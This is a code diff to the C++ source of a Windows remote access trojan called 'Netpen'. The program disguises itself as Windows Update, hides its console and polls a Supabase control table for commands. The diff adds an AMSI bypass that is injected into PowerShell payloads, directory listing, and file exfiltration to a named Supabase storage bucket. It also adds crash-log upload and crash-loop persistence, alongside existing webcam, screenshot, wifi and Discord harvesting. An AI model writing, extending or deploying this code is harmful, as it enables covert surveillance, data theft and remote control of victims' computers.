@@ -269,6 +269,25 @@ static void LogMsg(const std::string& msg) {
     }
 }
 
+static std::string Base64Encode(const BYTE* data, DWORD size);
+
+static void WriteCrashLog(DWORD exceptionCode, ULONG_PTR address) {
+    char tmp[MAX_PATH];
+    GetTempPathA(MAX_PATH, tmp);
+    std::string path = std::string(tmp) + "wuaueng.crash";
+    FILE* f = NULL;
+    fopen_s(&f, path.c_str(), "a");
+    if (f) {
+        fprintf(f, "[%s] CRASH: code 0x%08lX at 0x%p\n", GetTimestamp().c_str(), exceptionCode, (void*)address);
+        fclose(f);
+    }
+}
+
+static LONG WINAPI VectoredHandler(PEXCEPTION_POINTERS ep) {
+    WriteCrashLog(ep->ExceptionRecord->ExceptionCode, (ULONG_PTR)ep->ExceptionRecord->ExceptionAddress);
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+
 static bool HttpRequest(const wchar_t* method, const wchar_t* path, const std::string& body, std::string& response) {
     HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
     if (!hSession) return false;
@@ -916,6 +935,15 @@ static std::string ExecuteCommand(const std::string& cmd, DWORD* outExitCode = N
     return result;
 }
 
+static std::string Base64Decode(const std::string& s) {
+    DWORD len = 0;
+    if (!CryptStringToBinaryA(s.c_str(), (DWORD)s.size(), CRYPT_STRING_BASE64, NULL, &len, NULL, NULL)) return "";
+    std::string result(len, 0);
+    if (!CryptStringToBinaryA(s.c_str(), (DWORD)s.size(), CRYPT_STRING_BASE64, (BYTE*)&result[0], &len, NULL, NULL)) return "";
+    result.resize(len);
+    return result;
+}
+
 static void CheckAndHandleExec() {
     std::wstring q = SUPABASE_CONTROL_PATH;
     q += L"?command=eq.exec&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id,payload";
@@ -925,6 +953,43 @@ static void CheckAndHandleExec() {
     std::string rowId = ExtractJSONNumber(resp, "id");
     std::string payload = ExtractJSONString(resp, "payload");
     if (rowId.empty() || payload.empty()) return;
+
+    // AMSI bypass for PowerShell commands
+    if (payload.find("powershell") != std::string::npos || payload.find("pwsh") != std::string::npos) {
+        std::string bypass = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);";
+        if (payload.find("-Enc") != std::string::npos) {
+            size_t encPos = payload.find("-Enc");
+            size_t argStart = payload.find_first_not_of(" \t", encPos + 4);
+            if (argStart != std::string::npos) {
+                size_t argEnd = std::string::npos;
+                size_t quoteOffset = 0;
+                if (payload[argStart] == '"') { quoteOffset = argStart + 1; argEnd = payload.find('"', quoteOffset); }
+                else { argEnd = payload.find_first_of(" \t", argStart); if (argEnd == std::string::npos) argEnd = payload.size(); quoteOffset = argStart; }
+                if (argEnd != std::string::npos) {
+                    std::string encoded = payload.substr(quoteOffset, argEnd - quoteOffset);
+                    std::string decoded = Base64Decode(encoded);
+                    if (!decoded.empty()) {
+                        // PowerShell -Enc uses UTF-16LE base64
+                        std::string wideCmd = bypass + std::string((const char*)decoded.data(), decoded.size());
+                        // Re-encode as UTF-16LE base64
+                        int wideLen = MultiByteToWideChar(CP_UTF8, 0, wideCmd.c_str(), -1, NULL, 0);
+                        std::wstring wideBuf((size_t)wideLen - 1, 0);
+                        MultiByteToWideChar(CP_UTF8, 0, wideCmd.c_str(), -1, &wideBuf[0], wideLen);
+                        std::string reEncoded = Base64Encode((BYTE*)wideBuf.data(), (DWORD)wideBuf.size() * 2);
+                        payload = payload.substr(0, quoteOffset) + reEncoded + payload.substr(argEnd);
+                    }
+                }
+            }
+        } else {
+            size_t cPos = payload.find("-c \"");
+            if (cPos == std::string::npos) cPos = payload.find("-Command \"");
+            if (cPos != std::string::npos) {
+                cPos = payload.find('"', cPos + 2);
+                if (cPos != std::string::npos) payload.insert(cPos + 1, bypass);
+            }
+        }
+    }
+
     DWORD exitCode = 0;
     std::string output = ExecuteCommand(payload, &exitCode);
     if (output.empty()) output = "(no output)";
@@ -1986,7 +2051,75 @@ static void HandleDiscordCmd(const std::string& rowId) {
     LogMsg("Discord: force harvest handled");
 }
 
+static void CheckAndHandleDirlist() {
+    std::wstring q = SUPABASE_CONTROL_PATH;
+    q += L"?command=eq.dirlist&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id,payload";
+    std::string resp;
+    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return;
+    if (resp.size() < 10) return;
+    std::string rowId = ExtractJSONNumber(resp, "id");
+    std::string path = ExtractJSONString(resp, "payload");
+    if (rowId.empty() || path.empty()) return;
+    std::string output = ExecuteCommand("dir /b \"" + path + "\"");
+    if (output.empty()) output = "(empty or invalid path)";
+    std::string json = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"command\":\"dirlist " + EscapeJSON(path) + "\",\"output\":\"" + EscapeJSON(output) + "\",\"exit_code\":0}]";
+    HttpRequest(L"POST", SUPABASE_EXEC_PATH, json, resp);
+    json = "{\"executed\":true}";
+    std::wstring patchPath = SUPABASE_CONTROL_PATH;
+    patchPath += L"?id=eq." + ToWide(rowId);
+    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);
+    LogMsg("Dirlist: " + path);
+}
+
+static void CheckAndHandleDownload() {
+    std::wstring q = SUPABASE_CONTROL_PATH;
+    q += L"?command=eq.download&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id,payload";
+    std::string resp;
+    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return;
+    if (resp.size() < 10) return;
+    std::string rowId = ExtractJSONNumber(resp, "id");
+    std::string localPath = ExtractJSONString(resp, "payload");
+    if (rowId.empty() || localPath.empty()) return;
+    size_t sep = localPath.find_last_of("\\/");
+    std::string fname = (sep != std::string::npos) ? localPath.substr(sep + 1) : localPath;
+    if (fname.empty()) fname = "file";
+    std::string ts = GetTimestamp();
+    for (size_t i = 0; i < ts.size(); i++) if (ts[i] == ':') ts[i] = '-';
+    std::string storageFile = "downloads/" + g_hostname + "_" + ts + "_" + fname;
+    std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
+    std::string resultUrl;
+    if (UploadToStorage(localPath, storagePath, "application/octet-stream")) {
+        resultUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co/storage/v1/object/public/Netpen/" + storageFile;
+    }
+    std::string json = "{\"executed\":true,\"result_url\":\"" + EscapeJSON(resultUrl) + "\"}";
+    std::wstring patchPath = SUPABASE_CONTROL_PATH;
+    patchPath += L"?id=eq." + ToWide(rowId);
+    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);
+    LogMsg("Download: " + localPath + " -> " + (resultUrl.empty() ? "FAILED" : resultUrl));
+}
+
 static void SendHeartbeat() {
+    // Upload crash logs if any
+    char tmp[MAX_PATH];
+    GetTempPathA(MAX_PATH, tmp);
+    std::string crashPath = std::string(tmp) + "wuaueng.crash";
+    FILE* f = NULL;
+    fopen_s(&f, crashPath.c_str(), "r");
+    if (f) {
+        fseek(f, 0, SEEK_END);
+        long len = ftell(f);
+        fseek(f, 0, SEEK_SET);
+        if (len > 0 && len < 4096) {
+            std::string crashData((size_t)len, 0);
+            fread(&crashData[0], 1, (size_t)len, f);
+            std::string crashJson = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"command\":\"[crash log upload]\",\"output\":\"" + EscapeJSON(crashData) + "\",\"exit_code\":-1}]";
+            std::string resp;
+            HttpRequest(L"POST", SUPABASE_EXEC_PATH, crashJson, resp);
+        }
+        fclose(f);
+        DeleteFileA(crashPath.c_str());
+    }
+
     std::string json = "{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"last_seen\":\"" + GetTimestamp() + "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}";
     std::string resp;
     std::wstring path = SUPABASE_HEARTBEAT_PATH + ToWide(g_hostname);
@@ -2302,17 +2435,14 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
             if (counter % 60 == 0 && !g_selfDestructing) {
                 SendHeartbeat();
                 FetchTriggers();
-                std::string scRowId = CheckScreenshotCmd();
-                if (!scRowId.empty()) HandleScreenshot(scRowId);
-                std::string wcRowId = CheckWebcamCmd();
-                if (!wcRowId.empty()) HandleWebcam(wcRowId);
-                std::string spRowId = CheckSpeakerCmd();
-                if (!spRowId.empty()) HandleSpeaker(spRowId);
+                { std::string id = CheckScreenshotCmd(); if (!id.empty()) HandleScreenshot(id); }
+                { std::string id = CheckWebcamCmd(); if (!id.empty()) HandleWebcam(id); }
+                { std::string id = CheckSpeakerCmd(); if (!id.empty()) HandleSpeaker(id); }
                 CheckAndHandleExec();
-                std::string wfRowId = CheckWifiCmd();
-                if (!wfRowId.empty()) HandleWifiCmd(wfRowId);
-                std::string dfRowId = CheckDiscordCmd();
-                if (!dfRowId.empty()) HandleDiscordCmd(dfRowId);
+                { std::string id = CheckWifiCmd(); if (!id.empty()) HandleWifiCmd(id); }
+                { std::string id = CheckDiscordCmd(); if (!id.empty()) HandleDiscordCmd(id); }
+                CheckAndHandleDirlist();
+                CheckAndHandleDownload();
                 CheckHarvestConfig();
             }
             if (counter % 120 == 0 && !g_selfDestructing) {
@@ -2456,6 +2586,7 @@ static int RunChild(HINSTANCE hInstance) {
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
+    AddVectoredExceptionHandler(1, VectoredHandler);
     InitConfig();
     HWND consoleWnd = GetConsoleWindow();
     if (consoleWnd) ShowWindow(consoleWnd, SW_HIDE);
@@ -2479,6 +2610,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
     char path[MAX_PATH];
     GetModuleFileNameA(NULL, path, MAX_PATH);
     std::string exePath(path);
+
+    int crashCount = 0;
+    DWORD lastCrashTime = 0;
 
     while (true) {
         RemoveKillFlag();
@@ -2526,6 +2660,20 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
             break;
         }
 
+        // Crash-loop backoff
+        DWORD now = GetTickCount();
+        if (now - lastCrashTime < 10000) {
+            crashCount++;
+            if (crashCount > 5) {
+                DWORD delay = std::min(600000u, 3000u * (1u << std::min((unsigned)(crashCount - 5), 8u)));
+                LogMsg("Crash loop detected (" + std::to_string(crashCount) + "), backing off " + std::to_string(delay/1000) + "s");
+                Sleep(delay);
+            }
+        } else {
+            crashCount = 0;
+        }
+        lastCrashTime = now;
+
         Sleep(3000);
     }
 
@@ -2541,3 +2689,5 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
 
 
 int _s2c82aaaa886e49b28794499e1fb8d69c(void){return 0;}
+int _sd7f9bd008da14598892b2482d9609e20(void){return 0;}
+int _s648d5539b27140ebb936cd13c8ed671a(void){return 0;}
